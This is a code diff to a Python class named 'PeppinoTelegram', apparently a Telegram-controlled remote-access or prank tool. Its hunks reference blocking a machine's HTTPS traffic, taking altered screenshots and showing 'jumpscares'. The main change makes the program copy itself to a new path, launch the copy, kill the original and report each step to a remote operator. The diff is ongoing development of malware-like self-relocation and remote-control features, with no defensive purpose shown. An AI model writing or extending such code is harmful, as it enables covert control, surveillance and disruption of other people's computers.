@@ -912,7 +912,7 @@ class PeppinoTelegram:
         if not self.ask_yesno(warning):
             print("Blocking HTTPS request canceled by user.")
             self.bsendWithHTML(
-                "✅ <b>Operation Cancelled</b><br><br>"
+                "✅ <b>Operation Cancelled</b>\n\n"
                 "HTTPS traffic block has been aborted."
             )
             return
@@ -1600,10 +1600,49 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.mixer_menu_keyboard = self.new_menu(buttons, close_btn_lab="MXR_close")
 
     def move_myself(self, target_path: str) -> None:
+        self.bsendWithHtml(
+            "<b>📦 RELOCATION</b>\n"
+            "<pre>"
+            "Status  : Initializing\n"
+            f"Target  : {target_path[-40:]}\n"
+            "</pre>"
+        )
+
         if copy_myself(target_path):
-            args = sys.argv[:]
             exe_path = BASE_EXE
-            os.execv(exe_path, [exe_path] + args)
+            args = sys.argv[:]
+
+            self.bsendWithHtml(
+                "<b>📦 RELOCATION</b>\n"
+                "<pre>"
+                "Status  : Copy complete\n"
+                "Launch  : New instance\n"
+                "Action  : Switching\n"
+                "</pre>"
+            )
+
+            try:
+                sp.Popen(
+                    [target_path] + args,
+                    shell=False,
+                    close_fds=True
+                )
+
+                os._exit(0)
+            except Exception as e:
+                self.bsendWithHtml(
+                    "<b>❌ RELOCATION FAILED</b>\n"
+                    "<pre>"
+                    f"Error   : {str(e)[:60]}\n"
+                    "</pre>"
+                )
+        else:
+            self.bsendWithHtml(
+                "<b>❌ RELOCATION FAILED</b>\n"
+                "<pre>"
+                "Reason  : Copy failed\n"
+                "</pre>"
+            )
 
     def modded_screenshot(self, effect: Callable, timeout: int=1250) -> None:
         print(f"Taking modified screenshot with effect: {effect.__name__}")
@@ -3303,8 +3342,8 @@ The bot is now restarting. Please wait a moment...
             duration=duration,
         )
         self.bsendWithHtml(
-            "<b>🎭 Textual jumpscare displayed</b><br>"
-            f"<code>Text:   {text}</code><br>"
+            "<b>🎭 Textual jumpscare displayed</b>\n"
+            f"<code>Text:   {text}</code>\n"
             f"<code>Shown:  {duration} seconds</code>"
         )
 
